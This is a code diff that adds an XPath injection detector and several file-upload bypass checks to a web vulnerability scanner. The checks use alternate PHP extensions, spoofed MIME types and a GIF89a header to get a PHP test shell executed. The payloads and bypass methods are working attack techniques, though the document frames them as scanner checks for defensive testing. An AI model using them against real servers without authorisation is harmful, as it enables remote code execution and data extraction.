@@ -507,6 +507,76 @@ def crlf_url(ctx, url):
             return
 
 
+XPATH_ERROR_RES = [re.compile(p, re.I) for p in [
+    r"xpath", r"invalid expression", r"failed to evaluate",
+    r"not a valid xpath", r"libxml", r"domxpath", r"simplexmlelement",
+    r"xml parsing error.*xpath", r"xpathsyntax",
+]]
+
+
+def xpath_url(ctx, url):
+    """XPath injection — the one injection family Reconix lacked
+    (SQL, NoSQL and LDAP were covered; XPath was not). A parameter
+    interpolated into an XPath query (e.g. //user[name='VALUE'])
+    lets an attacker rewrite the query and read nodes they should
+    not reach.
+
+    Guards: error-based hits require the error text to be ABSENT
+    from the baseline response (a page that always prints 'xpath'
+    is not a hit); boolean hits require the TRUE and FALSE probes
+    to diverge sharply from each other, so a page that merely
+    echoes the payload back (TRUE/FALSE differ by one character)
+    can never qualify."""
+    client, F = ctx.client, ctx.findings
+    for name, orig in params_of(url):
+        base = client.fetch(url)
+        if not base.status:
+            continue
+        # 1) error-based: an unbalanced quote breaks the XPath query
+        for probe in ("'", '"', orig + "'"):
+            r = client.fetch(with_param(url, name, probe))
+            hit = next((rx for rx in XPATH_ERROR_RES
+                        if rx.search(r.body or "")), None)
+            base_hit = next((rx for rx in XPATH_ERROR_RES
+                             if rx.search(base.body or "")), None)
+            if r.status and hit and not base_hit:
+                F.add("High", "XPath Injection (error-based)", url,
+                      f"Parameter '{name}' breaks out of the XPath query; "
+                      "the parser error is reflected in the response.",
+                      proof=f"XPath error in response: {hit.pattern}",
+                      param=name, resp=r, cwe="CWE-643",
+                      payload=probe)
+                break
+        else:
+            # 2) boolean-based differential, string and numeric contexts
+            families = [
+                (f"{orig}' or '1'='1", f"{orig}' or '1'='2"),
+                (f"{orig} or 1=1", f"{orig} or 1=2"),
+            ]
+            for pt, pf in families:
+                t = client.fetch(with_param(url, name, pt))
+                f_ = client.fetch(with_param(url, name, pf))
+                if not (t.status and f_.status and t.body and f_.body):
+                    continue
+                stf = _sim(ctx, t.body, f_.body)
+                stb = _sim(ctx, base.body, t.body)
+                sfb = _sim(ctx, base.body, f_.body)
+                if stf < 0.80 and (stb < 0.95 or sfb < 0.95):
+                    F.add("Medium", "XPath Injection (boolean-based blind)",
+                          url,
+                          f"Parameter '{name}' is interpreted as XPath: "
+                          "the TRUE condition and the FALSE condition "
+                          "return sharply different results "
+                          f"(similarity {stf:.2f}), so data can be "
+                          "extracted node by node.",
+                          proof=f"similarity TRUE/FALSE={stf:.2f} "
+                                f"base/TRUE={stb:.2f} base/FALSE={sfb:.2f}",
+                          param=name, resp=t, cwe="CWE-643",
+                          confidence="Needs manual confirmation",
+                          payload=pt)
+                    break
+
+
 def cors_check(ctx, url):
     client, F = ctx.client, ctx.findings
     origin = "https://evil.attacker.example"
@@ -853,6 +923,44 @@ def upload_check(ctx, page_url, form):
         if found:
             F.add("Critical", "File Upload — Remote Code Execution (double ext)",
                   found, "A .php.txt upload is executed as PHP by the server.",
+                  proof=f"GET {found} -> 51317", param=ff, resp=r, cwe="CWE-434")
+            continue
+        # 3) extension bypass variants — servers that block .php but still
+        # run other PHP-mapped extensions or case variants of it.
+        for ext, label in (("php5", "File Upload — Remote Code Execution (.php5)"),
+                           ("phtml", "File Upload — Remote Code Execution (.phtml)"),
+                           ("PHP", "File Upload — Remote Code Execution (uppercase extension)")):
+            vname = f"wscan_shell.{ext}"
+            r = client.fetch_multipart(action, plain_fields,
+                                       {ff: (vname, code, "application/x-php")})
+            found = _locate_upload(ctx, action, vname, "51317")
+            if found:
+                F.add("Critical", label, found,
+                      f"An uploaded .{ext} file executes on the server "
+                      "(7331*7 was computed to 51317). Full server compromise.",
+                      proof=f"GET {found} -> 51317", param=ff, resp=r, cwe="CWE-434")
+                break
+        # 4) content-type bypass — the server checks the declared MIME type
+        # instead of the extension, so the same .php file passes as an image.
+        r = client.fetch_multipart(action, plain_fields,
+                                   {ff: (sname, code, "image/jpeg")})
+        found = _locate_upload(ctx, action, sname, "51317")
+        if found:
+            F.add("Critical", "File Upload — Remote Code Execution (content-type bypass)",
+                  found, "A .php file declared as image/jpeg executes on the "
+                  "server (7331*7 was computed to 51317). Full server compromise.",
+                  proof=f"GET {found} -> 51317", param=ff, resp=r, cwe="CWE-434")
+            continue
+        # 5) magic-byte bypass — a GIF header fools signature checks while
+        # the PHP block still executes.
+        gcode = "GIF89a\n" + code
+        r = client.fetch_multipart(action, plain_fields,
+                                   {ff: (sname, gcode, "image/gif")})
+        found = _locate_upload(ctx, action, sname, "51317")
+        if found:
+            F.add("Critical", "File Upload — Remote Code Execution (magic-byte bypass)",
+                  found, "A .php file with a GIF89a header executes on the "
+                  "server (7331*7 was computed to 51317). Full server compromise.",
                   proof=f"GET {found} -> 51317", param=ff, resp=r, cwe="CWE-434")
 
 
